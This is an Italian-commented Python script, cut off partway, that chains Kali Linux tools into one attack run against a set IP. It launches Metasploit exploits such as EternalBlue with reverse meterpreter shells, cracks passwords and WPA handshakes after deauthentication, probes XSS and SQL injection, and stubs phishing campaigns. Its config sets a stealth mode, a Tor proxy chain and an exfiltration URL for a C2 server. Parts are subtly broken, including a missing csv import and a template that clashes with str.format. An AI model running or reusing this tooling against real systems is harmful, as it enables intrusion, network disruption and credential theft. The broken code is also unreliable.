#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sistema di Test di Sicurezza per Kali Linux
Ottimizzato per portatili con strumenti nativi di Kali
"""

import os
import sys
import time
import random
import socket
import threading
import subprocess
import requests
import hashlib
import base64
import json
import logging
import ipaddress
import asyncio
import aiohttp
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
from datetime import datetime, timedelta
from scapy.all import *
from scapy.layers.tls.record import TLS
from scapy.layers.tls.handshake import TLSClientHello
from multiprocessing import Pool, Manager, cpu_count
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report
import networkx as nx
import cv2
import pytesseract
import speech_recognition as sr
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

# =============================================
# CONFIGURAZIONE PER KALI LINUX
# =============================================
TARGET = "192.168.100.10"
DOMAIN = "test.local"
DURATION = 1800
STEALTH_MODE = True
ENCRYPT_LOGS = True
EXFIL_URL = "https://secure-c2-server.com/data"
PROXY_CHAIN = [
    "socks5://127.0.0.1:9050",
    "http://127.0.0.1:8080"
]
THREAT_INTEL_FEEDS = [
    "https://threatfeed.example.com/api/v1/indicators"
]
KALI_TOOLS = {
    'nmap': '/usr/bin/nmap',
    'metasploit': '/usr/bin/msfconsole',
    'burpsuite': '/usr/bin/burpsuite',
    'wireshark': '/usr/bin/wireshark',
    'john': '/usr/bin/john',
    'hashcat': '/usr/bin/hashcat',
    'aircrack': '/usr/bin/aircrack-ng',
    'hydra': '/usr/bin/hydra',
    'nikto': '/usr/bin/nikto',
    'sqlmap': '/usr/bin/sqlmap',
    'set': '/usr/bin/setoolkit'
}

# Generazione chiave crittografia
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Configurazione logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("kali_security_test.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# =============================================
# SISTEMA DI NETWORK SCANNING CON NMAP
# =============================================
class KaliNetworkScanner:
    def __init__(self):
        self.nmap_path = KALI_TOOLS['nmap']
        self.scan_results = []
    
    def run_nmap_scan(self, target, scan_type="-sS"):
        """Esegue scansione NMAP con opzioni avanzate"""
        cmd = [
            self.nmap_path,
            scan_type,
            "-O",
            "-sV",
            "--script=vuln",
            "-oX", "nmap_results.xml",
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                self.parse_nmap_results("nmap_results.xml")
                return True
            else:
                logger.error(f"NMAP scan failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("NMAP scan timed out")
            return False
        except Exception as e:
            logger.error(f"Error running NMAP: {str(e)}")
            return False
    
    def parse_nmap_results(self, xml_file):
        """Analizza risultati NMAP"""
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            for host in root.findall('host'):
                host_info = {
                    'ip': '',
                    'state': '',
                    'ports': [],
                    'os': '',
                    'vulnerabilities': []
                }
                
                # Estrai IP
                address = host.find('address')
                if address is not None:
                    host_info['ip'] = address.get('addr')
                
                # Estrai stato
                status = host.find('status')
                if status is not None:
                    host_info['state'] = status.get('state')
                
                # Estrai porte
                ports = host.find('ports')
                if ports is not None:
                    for port in ports.findall('port'):
                        port_info = {
                            'port': port.get('portid'),
                            'protocol': port.get('protocol'),
                            'state': '',
                            'service': ''
                        }
                        
                        state = port.find('state')
                        if state is not None:
                            port_info['state'] = state.get('state')
                        
                        service = port.find('service')
                        if service is not None:
                            port_info['service'] = service.get('name')
                        
                        host_info['ports'].append(port_info)
                
                # Estrai OS
                os = host.find('os')
                if os is not None:
                    osmatch = os.find('osmatch')
                    if osmatch is not None:
                        host_info['os'] = osmatch.get('name')
                
                # Estrai vulnerabilità
                scripts = host.find('.//script')
                if scripts is not None:
                    for script in host.findall('.//script'):
                        if 'vuln' in script.get('id', ''):
                            vuln_info = {
                                'id': script.get('id'),
                                'output': script.get('output')
                            }
                            host_info['vulnerabilities'].append(vuln_info)
                
                self.scan_results.append(host_info)
            
            logger.info(f"NMAP results parsed: {len(self.scan_results)} hosts found")
            return True
        except Exception as e:
            logger.error(f"Error parsing NMAP results: {str(e)}")
            return False
    
    def get_open_ports(self):
        """Restituisce porte aperte trovate"""
        open_ports = []
        for host in self.scan_results:
            for port in host['ports']:
                if port['state'] == 'open':
                    open_ports.append({
                        'host': host['ip'],
                        'port': port['port'],
                        'protocol': port['protocol'],
                        'service': port['service']
                    })
        return open_ports
    
    def get_vulnerabilities(self):
        """Restituisce vulnerabilità trovate"""
        vulnerabilities = []
        for host in self.scan_results:
            for vuln in host['vulnerabilities']:
                vulnerabilities.append({
                    'host': host['ip'],
                    'id': vuln['id'],
                    'output': vuln['output']
                })
        return vulnerabilities

# =============================================
# SISTEMA DI VULNERABILITY ASSESSMENT
# =============================================
class KaliVulnerabilityScanner:
    def __init__(self):
        self.nikto_path = KALI_TOOLS['nikto']
        self.sqlmap_path = KALI_TOOLS['sqlmap']
        self.vulnerabilities = []
    
    def run_nikto_scan(self, target_url):
        """Esegue scansione con Nikto"""
        cmd = [
            self.nikto_path,
            "-h", target_url,
            "-Format", "xml",
            "-output", "nikto_results.xml"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                self.parse_nikto_results("nikto_results.xml")
                return True
            else:
                logger.error(f"Nikto scan failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("Nikto scan timed out")
            return False
        except Exception as e:
            logger.error(f"Error running Nikto: {str(e)}")
            return False
    
    def parse_nikto_results(self, xml_file):
        """Analizza risultati Nikto"""
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            for item in root.findall('.//item'):
                vuln = {
                    'id': item.get('id'),
                    'osvdb': item.get('osvdb'),
                    'method': item.get('method'),
                    'url': item.get('uri'),
                    'description': item.text
                }
                self.vulnerabilities.append(vuln)
            
            logger.info(f"Nikto results parsed: {len(self.vulnerabilities)} vulnerabilities found")
            return True
        except Exception as e:
            logger.error(f"Error parsing Nikto results: {str(e)}")
            return False
    
    def run_sqlmap_scan(self, target_url):
        """Esegue scansione SQL injection con SQLMap"""
        cmd = [
            self.sqlmap_path,
            "-u", target_url,
            "--batch",
            "--output-dir=sqlmap_results"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                self.parse_sqlmap_results("sqlmap_results")
                return True
            else:
                logger.error(f"SQLMap scan failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("SQLMap scan timed out")
            return False
        except Exception as e:
            logger.error(f"Error running SQLMap: {str(e)}")
            return False
    
    def parse_sqlmap_results(self, results_dir):
        """Analizza risultati SQLMap"""
        try:
            for file in os.listdir(results_dir):
                if file.endswith(".log"):
                    with open(os.path.join(results_dir, file), 'r') as f:
                        content = f.read()
                        if "is vulnerable" in content:
                            vuln = {
                                'type': 'SQL Injection',
                                'url': file.replace(".log", ""),
                                'details': content
                            }
                            self.vulnerabilities.append(vuln)
            
            logger.info(f"SQLMap results parsed: {len([v for v in self.vulnerabilities if v['type'] == 'SQL Injection'])} SQLi found")
            return True
        except Exception as e:
            logger.error(f"Error parsing SQLMap results: {str(e)}")
            return False
    
    def get_vulnerabilities(self):
        """Restituisce tutte le vulnerabilità trovate"""
        return self.vulnerabilities

# =============================================
# SISTEMA DI EXPLOITATION CON METASPLOIT
# =============================================
class KaliExploitationFramework:
    def __init__(self):
        self.msf_path = KALI_TOOLS['metasploit']
        self.exploits = []
        self.sessions = []
    
    def run_msfconsole_script(self, script_content):
        """Esegue script MSFConsole"""
        try:
            with open("msf_script.rc", "w") as f:
                f.write(script_content)
            
            cmd = [
                self.msf_path,
                "-r", "msf_script.rc"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                self.parse_msf_results(result.stdout)
                return True
            else:
                logger.error(f"MSFConsole script failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("MSFConsole script timed out")
            return False
        except Exception as e:
            logger.error(f"Error running MSFConsole: {str(e)}")
            return False
    
    def parse_msf_results(self, output):
        """Analizza risultati MSFConsole"""
        lines = output.split('\n')
        
        for line in lines:
            if "Exploit completed" in line:
                self.exploits.append({
                    'status': 'success',
                    'details': line
                })
            elif "Exploit failed" in line:
                self.exploits.append({
                    'status': 'failed',
                    'details': line
                })
            elif "Meterpreter session" in line:
                session_id = line.split(' ')[-1]
                self.sessions.append(session_id)
        
        logger.info(f"MSF results parsed: {len(self.exploits)} exploits, {len(self.sessions)} sessions")
        return True
    
    def generate_exploit_script(self, target, vuln_type):
        """Genera script di exploit per Metasploit"""
        scripts = {
            'smb_ms17_010': f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
""",
            'apache_struts2': f"""
use exploit/multi/http/struts2_rest_xstream
set RHOSTS {target}
set RPORT 8080
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
""",
            'vsftpd_234_backdoor': f"""
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set PAYLOAD cmd/unix/interact
exploit
"""
        }
        
        return scripts.get(vuln_type, "")
    
    def run_exploit(self, target, vuln_type):
        """Esegue exploit specifico"""
        script = self.generate_exploit_script(target, vuln_type)
        if script:
            return self.run_msfconsole_script(script)
        else:
            logger.error(f"No exploit script found for {vuln_type}")
            return False
    
    def get_exploits(self):
        """Restituisce risultati exploit"""
        return self.exploits
    
    def get_sessions(self):
        """Restituisce sessioni attive"""
        return self.sessions

# =============================================
# SISTEMA DI PASSWORD CRACKING
# =============================================
class KaliPasswordCracker:
    def __init__(self):
        self.john_path = KALI_TOOLS['john']
        self.hashcat_path = KALI_TOOLS['hashcat']
        self.wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/wfuzz/general/common.txt"
        ]
        self.cracked_passwords = []
    
    def crack_with_john(self, hash_file, hash_type="raw-md5"):
        """Crack password con John the Ripper"""
        cmd = [
            self.john_path,
            "--format=" + hash_type,
            "--wordlist=" + self.wordlists[0],
            hash_file
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            if result.returncode == 0:
                self.parse_john_results(hash_file + ".pot")
                return True
            else:
                logger.error(f"John the Ripper failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("John the Ripper timed out")
            return False
        except Exception as e:
            logger.error(f"Error running John the Ripper: {str(e)}")
            return False
    
    def parse_john_results(self, pot_file):
        """Analizza risultati John the Ripper"""
        try:
            with open(pot_file, 'r') as f:
                for line in f:
                    if ":" in line:
                        hash_part, password = line.split(":", 1)
                        self.cracked_passwords.append({
                            'hash': hash_part,
                            'password': password.strip()
                        })
            
            logger.info(f"John results parsed: {len(self.cracked_passwords)} passwords cracked")
            return True
        except Exception as e:
            logger.error(f"Error parsing John results: {str(e)}")
            return False
    
    def crack_with_hashcat(self, hash_file, hash_type=0):
        """Crack password con Hashcat"""
        cmd = [
            self.hashcat_path,
            "-m", str(hash_type),
            "-a", "0",
            hash_file,
            self.wordlists[0],
            "--potfile-path=hashcat.pot"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            if result.returncode == 0:
                self.parse_hashcat_results("hashcat.pot")
                return True
            else:
                logger.error(f"Hashcat failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("Hashcat timed out")
            return False
        except Exception as e:
            logger.error(f"Error running Hashcat: {str(e)}")
            return False
    
    def parse_hashcat_results(self, pot_file):
        """Analizza risultati Hashcat"""
        try:
            with open(pot_file, 'r') as f:
                for line in f:
                    if ":" in line:
                        hash_part, password = line.split(":", 1)
                        self.cracked_passwords.append({
                            'hash': hash_part,
                            'password': password.strip()
                        })
            
            logger.info(f"Hashcat results parsed: {len(self.cracked_passwords)} passwords cracked")
            return True
        except Exception as e:
            logger.error(f"Error parsing Hashcat results: {str(e)}")
            return False
    
    def get_cracked_passwords(self):
        """Restituisce password craccate"""
        return self.cracked_passwords

# =============================================
# SISTEMA DI WIRELESS SECURITY
# =============================================
class KaliWirelessSecurity:
    def __init__(self):
        self.aircrack_path = KALI_TOOLS['aircrack']
        self.interfaces = self.get_wireless_interfaces()
        self.networks = []
        self.handshakes = []
    
    def get_wireless_interfaces(self):
        """Ottiene interfacce wireless disponibili"""
        interfaces = []
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if line and not line.startswith(' '):
                    interface = line.split()[0]
                    if 'IEEE 802.11' in result.stdout:
                        interfaces.append(interface)
            
            return interfaces
        except Exception as e:
            logger.error(f"Error getting wireless interfaces: {str(e)}")
            return []
    
    def set_monitor_mode(self, interface):
        """Imposta modalità monitor su interfaccia wireless"""
        try:
            # Disattiva interfaccia
            subprocess.run(["airmon-ng", "stop", interface], check=True)
            
            # Avvia modalità monitor
            result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)
            
            if result.returncode == 0:
                # Estrai nome interfaccia in modalità monitor
                monitor_interface = result.stdout.split('monitor mode enabled on ')[1].split(')')[0]
                return monitor_interface
            else:
                logger.error(f"Failed to set monitor mode: {result.stderr}")
                return None
        except Exception as e:
            logger.error(f"Error setting monitor mode: {str(e)}")
            return None
    
    def scan_networks(self, interface, duration=30):
        """Scansiona reti wireless"""
        try:
            # Avvia airodump-ng per scansione
            cmd = [
                "airodump-ng",
                interface,
                "-w", "wireless_scan",
                "--output-format", "csv",
                f"--write-interval", str(duration)
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            process.terminate()
            
            # Analizza risultati
            self.parse_wireless_scan("wireless_scan-01.csv")
            return True
        except Exception as e:
            logger.error(f"Error scanning wireless networks: {str(e)}")
            return False
    
    def parse_wireless_scan(self, csv_file):
        """Analizza risultati scansione wireless"""
        try:
            with open(csv_file, 'r') as f:
                reader = csv.reader(f)
                next(reader)  # Salta intestazione
                
                for row in reader:
                    if len(row) > 13 and row[0]:
                        network = {
                            'bssid': row[0],
                            'channel': row[3],
                            'speed': row[4],
                            'privacy': row[5],
                            'cipher': row[6],
                            'auth': row[7],
                            'power': row[8],
                            'beacons': row[9],
                            'iv': row[10],
                            'lan_ip': row[11],
                            'id_length': row[12],
                            'essid': row[13]
                        }
                        self.networks.append(network)
            
            logger.info(f"Wireless scan parsed: {len(self.networks)} networks found")
            return True
        except Exception as e:
            logger.error(f"Error parsing wireless scan: {str(e)}")
            return False
    
    def capture_handshake(self, interface, bssid, channel, essid, duration=60):
        """Cattura handshake WPA/WPA2"""
        try:
            # Imposta canale
            subprocess.run(["iwconfig", interface, "channel", channel], check=True)
            
            # Avvia airodump-ng per cattura handshake
            cmd = [
                "airodump-ng",
                interface,
                "-c", channel,
                "--bssid", bssid,
                "-w", "handshake_capture",
                "--output-format", "pcap"
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Invia pacchetti deautenticazione
            deauth_cmd = [
                "aireplay-ng",
                "--deauth", "10",
                "-a", bssid,
                interface
            ]
            
            subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(duration)
            process.terminate()
            
            # Verifica presenza handshake
            if self.check_handshake("handshake_capture-01.cap", bssid):
                self.handshakes.append({
                    'bssid': bssid,
                    'essid': essid,
                    'file': "handshake_capture-01.cap"
                })
                return True
            else:
                logger.info("Handshake not captured")
                return False
        except Exception as e:
            logger.error(f"Error capturing handshake: {str(e)}")
            return False
    
    def check_handshake(self, cap_file, bssid):
        """Verifica presenza handshake in file cattura"""
        try:
            cmd = ["aircrack-ng", cap_file, "-b", bssid]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "1 handshake" in result.stdout:
                return True
            else:
                return False
        except Exception as e:
            logger.error(f"Error checking handshake: {str(e)}")
            return False
    
    def crack_handshake(self, handshake_file, wordlist):
        """Crack password WPA/WPA2"""
        try:
            cmd = [
                "aircrack-ng",
                "-w", wordlist,
                "-b", handshake_file['bssid'],
                handshake_file['file']
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            
            if "KEY FOUND" in result.stdout:
                password = result.stdout.split("[")[1].split("]")[0]
                handshake_file['password'] = password
                return True
            else:
                logger.info("Password not found")
                return False
        except subprocess.TimeoutExpired:
            logger.error("Handshake cracking timed out")
            return False
        except Exception as e:
            logger.error(f"Error cracking handshake: {str(e)}")
            return False
    
    def get_networks(self):
        """Restituisce reti trovate"""
        return self.networks
    
    def get_handshakes(self):
        """Restituisce handshake catturati"""
        return self.handshakes

# =============================================
# SISTEMA DI WEB APPLICATION TESTING
# =============================================
class KaliWebAppTester:
    def __init__(self):
        self.burpsuite_path = KALI_TOOLS['burpsuite']
        self.sqlmap_path = KALI_TOOLS['sqlmap']
        self.nikto_path = KALI_TOOLS['nikto']
        self.vulnerabilities = []
    
    def run_burpsuite_scan(self, target_url):
        """Esegue scansione con Burp Suite"""
        try:
            # Burp Suite richiede configurazione manuale o API
            # Qui simuliamo l'avvio di Burp Suite
            logger.info(f"Starting Burp Suite for {target_url}")
            logger.info("Please configure Burp Suite manually and run the scan")
            
            # In una versione reale, si userebbe l'API di Burp Suite
            return True
        except Exception as e:
            logger.error(f"Error running Burp Suite: {str(e)}")
            return False
    
    def run_sqlmap_scan(self, target_url):
        """Esegue scansione SQL injection con SQLMap"""
        cmd = [
            self.sqlmap_path,
            "-u", target_url,
            "--batch",
            "--level=5",
            "--risk=3",
            "--output-dir=sqlmap_results"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                self.parse_sqlmap_results("sqlmap_results")
                return True
            else:
                logger.error(f"SQLMap scan failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("SQLMap scan timed out")
            return False
        except Exception as e:
            logger.error(f"Error running SQLMap: {str(e)}")
            return False
    
    def parse_sqlmap_results(self, results_dir):
        """Analizza risultati SQLMap"""
        try:
            for file in os.listdir(results_dir):
                if file.endswith(".log"):
                    with open(os.path.join(results_dir, file), 'r') as f:
                        content = f.read()
                        if "is vulnerable" in content:
                            vuln = {
                                'type': 'SQL Injection',
                                'url': file.replace(".log", ""),
                                'details': content
                            }
                            self.vulnerabilities.append(vuln)
            
            logger.info(f"SQLMap results parsed: {len([v for v in self.vulnerabilities if v['type'] == 'SQL Injection'])} SQLi found")
            return True
        except Exception as e:
            logger.error(f"Error parsing SQLMap results: {str(e)}")
            return False
    
    def run_nikto_scan(self, target_url):
        """Esegue scansione con Nikto"""
        cmd = [
            self.nikto_path,
            "-h", target_url,
            "-Format", "xml",
            "-output", "nikto_results.xml"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if result.returncode == 0:
                self.parse_nikto_results("nikto_results.xml")
                return True
            else:
                logger.error(f"Nikto scan failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            logger.error("Nikto scan timed out")
            return False
        except Exception as e:
            logger.error(f"Error running Nikto: {str(e)}")
            return False
    
    def parse_nikto_results(self, xml_file):
        """Analizza risultati Nikto"""
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            for item in root.findall('.//item'):
                vuln = {
                    'id': item.get('id'),
                    'osvdb': item.get('osvdb'),
                    'method': item.get('method'),
                    'url': item.get('uri'),
                    'description': item.text
                }
                self.vulnerabilities.append(vuln)
            
            logger.info(f"Nikto results parsed: {len(self.vulnerabilities)} vulnerabilities found")
            return True
        except Exception as e:
            logger.error(f"Error parsing Nikto results: {str(e)}")
            return False
    
    def test_xss(self, target_url):
        """Testa vulnerabilità XSS"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                response = requests.get(target_url + "?param=" + payload, timeout=5)
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'url': target_url,
                        'payload': payload,
                        'evidence': 'Payload found in response'
                    })
            except Exception as e:
                logger.error(f"Error testing XSS: {str(e)}")
        
        logger.info(f"XSS test completed: {len([v for v in self.vulnerabilities if v['type'] == 'XSS'])} vulnerabilities found")
        return True
    
    def get_vulnerabilities(self):
        """Restituisce vulnerabilità trovate"""
        return self.vulnerabilities

# =============================================
# SISTEMA DI SOCIAL ENGINEERING
# =============================================
class KaliSocialEngineering:
    def __init__(self):
        self.set_path = KALI_TOOLS['set']
        self.campaigns = []
    
    def create_phishing_campaign(self, target_email, template_name):
        """Crea campagna phishing con SET"""
        try:
            # SET richiede configurazione interattiva
            # Qui simuliamo la creazione di una campagna
            logger.info(f"Creating phishing campaign for {target_email}")
            logger.info(f"Using template: {template_name}")
            
            # In una versione reale, si userebbe l'interfaccia di SET
            campaign = {
                'target': target_email,
                'template': template_name,
                'status': 'created',
                'created_at': datetime.now().isoformat()
            }
            
            self.campaigns.append(campaign)
            return True
        except Exception as e:
            logger.error(f"Error creating phishing campaign: {str(e)}")
            return False
    
    def run_phishing_campaign(self, campaign_id):
        """Esegue campagna phishing"""
        try:
            campaign = self.campaigns[campaign_id]
            logger.info(f"Running phishing campaign for {campaign['target']}")
            
            # Simula invio email phishing
            campaign['status'] = 'running'
            campaign['started_at'] = datetime.now().isoformat()
            
            # In una versione reale, si userebbe SET per inviare email
            return True
        except Exception as e:
            logger.error(f"Error running phishing campaign: {str(e)}")
            return False
    
    def check_phishing_results(self, campaign_id):
        """Controlla risultati campagna phishing"""
        try:
            campaign = self.campaigns[campaign_id]
            logger.info(f"Checking results for campaign {campaign_id}")
            
            # Simula risultati
            campaign['status'] = 'completed'
            campaign['completed_at'] = datetime.now().isoformat()
            campaign['results'] = {
                'emails_sent': 1,
                'emails_opened': 1,
                'clicks': 1,
                'credentials_stolen': 0
            }
            
            return True
        except Exception as e:
            logger.error(f"Error checking phishing results: {str(e)}")
            return False
    
    def get_campaigns(self):
        """Restituisce campagne create"""
        return self.campaigns

# =============================================
# SISTEMA DI REPORTING
# =============================================
class KaliReportGenerator:
    def __init__(self):
        self.report_template = self.load_report_template()
    
    def load_report_template(self):
        """Carica template per report"""
        return """
        <html>
        <head>
            <title>Kali Linux Security Test Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                h1 { color: #333; }
                h2 { color: #555; }
                table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                .critical { background-color: #ffdddd; }
                .high { background-color: #ffebcd; }
                .medium { background-color: #ffffcc; }
                .low { background-color: #ddffdd; }
            </style>
        </head>
        <body>
            <h1>Kali Linux Security Test Report</h1>
            <p><strong>Target:</strong> {target}</p>
            <p><strong>Date:</strong> {date}</p>
            <p><strong>Duration:</strong> {duration} seconds</p>
            
            <h2>Executive Summary</h2>
            <p>{executive_summary}</p>
            
            <h2>Network Scan Results</h2>
            {network_results}
            
            <h2>Vulnerability Assessment</h2>
            {vulnerability_results}
            
            <h2>Exploitation Results</h2>
            {exploitation_results}
            
            <h2>Password Cracking Results</h2>
            {password_results}
            
            <h2>Wireless Security Results</h2>
            {wireless_results}
            
            <h2>Web Application Testing Results</h2>
            {webapp_results}
            
            <h2>Social Engineering Results</h2>
            {social_results}
            
            <h2>Recommendations</h2>
            {recommendations}
        </body>
        </html>
        """
    
    def generate_network_results_table(self, scanner):
        """Genera tabella risultati scansione rete"""
        open_ports = scanner.get_open_ports()
        
        if not open_ports:
            return "<p>No open ports found.</p>"
        
        table = """
        <table>
            <tr>
                <th>Host</th>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
            </tr>
        """
        
        for port in open_ports:
            table += f"""
            <tr>
                <td>{port['host']}</td>
                <td>{port['port']}</td>
                <td>{port['protocol']}</td>
                <td>{port['service']}</td>
            </tr>
            """
        
        table += "</table>"
        return table
    
    def generate_vulnerability_results_table(self, vuln_scanner):
        """Genera tabella risultati vulnerabilità"""
        vulnerabilities = vuln_scanner.get_vulnerabilities()
        
        if not vulnerabilities:
            return "<p>No vulnerabilities found.</p>"
        
        table = """
        <table>
            <tr>
                <th>Type</th>
                <th>Target</th>
                <th>Details</th>
            </tr>
        """
        
        for vuln in vulnerabilities:
            table += f"""
            <tr>
                <td>{vuln.get('type', 'Unknown')}</td>
                <td>{vuln.get('url', vuln.get('host', 'Unknown'))}</td>
                <td>{vuln.get('description', vuln.get('output', 'No details'))}</td>
            </tr>
            """
        
        table += "</table>"
        return table
    
    def generate_exploitation_results_table(self, exploit_framework):
        """Genera tabella risultati exploit"""
        exploits = exploit_framework.get_exploits()
        sessions = exploit_framework.get_sessions()
        
        if not exploits:
            return "<p>No exploits attempted.</p>"
        
        table = """
        <table>
            <tr>
                <th>Status</th>
                <th>Details</th>
            </tr>
        """
        
        for exploit in exploits:
            table += f"""
            <tr>
                <td>{exploit['status']}</td>
                <td>{exploit['details']}</td>
            </tr>
            """
        
        table += "</table>"
        
        if sessions:
            table += f"<p>Active sessions: {', '.join(sessions)}</p>"
        
        return table
    
    def generate_password_results_table(self, password_cracker):
        """Genera tabella risultati password cracking"""
        passwords = password_cracker.get_cracked_passwords()
        
        if not passwords:
            return "<p>No passwords cracked.</p>"
        
        table = """
        <table>
            <tr>
                <th>Hash</th>
                <th>Password</th>
            </tr>
        """
        
        for pwd in passwords:
            table += f"""
            <tr>
                <td>{pwd['hash']}</td>
                <td>{pwd['password']}</td>
            </tr>
            """
        
        table += "</table>"
        return table
    
    def generate_wireless_results_table(self, wireless_security):
        """Genera tabella risultati wireless"""
        networks = wireless_security.get_networks()
        handshakes = wireless_security.get_handshakes()
        
        if not networks:
            return "<p>No wireless networks found.</p>"
        
        table = """
        <table>
            <tr>
                <th>BSSID</th>
                <th>ESSID</th>
                <th>Channel</th>
                <th>Privacy</th>
                <th>Power</th>
            </tr>
        """
        
        for net in networks:
            table += f"""
            <tr>
                <td>{net['bssid']}</td>
                <td>{net['essid']}</td>
                <td>{net['channel']}</td>
                <td>{net['privacy']}</td>
                <td>{net['power']}</td>
            </tr>
            """
        
        table += "</table>"
        
        if handshakes:
            table += "<h3>Captured Handshakes</h3>"
            table += """
            <table>
                <tr>
                    <th>BSSID</th>
                    <th>ESSID</th>
                    <th>Password</th>
                </tr>
            """
            
            for handshake in handshakes:
                table += f"""
                <tr>
                    <td>{handshake['bssid']}</td>
                    <td>{handshake['essid']}</td>
                    <td>{handshake.get('password', 'Not cracked')}</td>
                </tr>
                """
            
            table += "</table>"
        
        return table
    
    def generate_webapp_results_table(self, webapp_tester):
        """Genera tabella risultati web application"""
        vulnerabilities = webapp_tester.get_vulnerabilities()
        
        if not vulnerabilities:
            return "<p>No web application vulnerabilities found.</p>"
        
        table = """
        <table>
            <tr>
                <th>Type</th>
                <th>URL</th>
                <th>Details</th>
            </tr>
        """
        
        for vuln in vulnerabilities:
            table += f"""
            <tr>
                <td>{vuln['type']}</td>
                <td>{vuln['url']}</td>
                <td>{vuln.get('description', vuln.get('payload', 'No details'))}</td>
            </tr>
            """
        
        table += "</table>"
        return table
    
    def generate_social_results_table(self, social_engineering):
        """Genera tabella risultati social engineering"""
        campaigns = social_engineering.get_campaigns()
        
        if not campaigns:
            return "<p>No social engineering campaigns created.</p>"
        
        table = """
        <table>
            <tr>
                <th>Target</th>
                <th>Template</th>
                <th>Status</th>
                <th>Results</th>
            </tr>
        """
        
        for campaign in campaigns:
            results = campaign.get('results', {})
            table += f"""
            <tr>
                <td>{campaign['target']}</td>
                <td>{campaign['template']}</td>
                <td>{campaign['status']}</td>
                <td>Emails sent: {results.get('emails_sent', 0)}, 
                    Opened: {results.get('emails_opened', 0)}, 
                    Clicks: {results.get('clicks', 0)}</td>
            </tr>
            """
        
        table += "</table>"
        return table
    
    def generate_recommendations(self, results):
        """Genera raccomandazioni basate sui risultati"""
        recommendations = []
        
        # Raccomandazioni per vulnerabilità di rete
        if results['network_results']['open_ports']:
            recommendations.append("Review open ports and close unnecessary ones")
        
        # Raccomandazioni per vulnerabilità
        if results['vulnerability_results']['vulnerabilities']:
            recommendations.append("Patch identified vulnerabilities")
        
        # Raccomandazioni per exploit
        if results['exploitation_results']['exploits']:
            recommendations.append("Review and secure systems that were successfully exploited")
        
        # Raccomandazioni per password
        if results['password_results']['passwords']:
            recommendations.append("Implement stronger password policies")
        
        # Raccomandazioni per wireless
        if results['wireless_results']['handshakes']:
            recommendations.append("Secure wireless networks with strong encryption")
        
        # Raccomandazioni per web application
        if results['webapp_results']['vulnerabilities']:
            recommendations.append("Fix web application vulnerabilities")
        
        # Raccomandazioni per social engineering
        if results['social_results']['campaigns']:
            recommendations.append("Conduct security awareness training")
        
        if not recommendations:
            recommendations.append("No specific recommendations - maintain current security posture")
        
        return "<ul>" + "".join(f"<li>{rec}</li>" for rec in recommendations) + "</ul>"
    
    def generate_report(self, results):
        """Genera report completo"""
        report_content = self.report_template.format(
            target=TARGET,
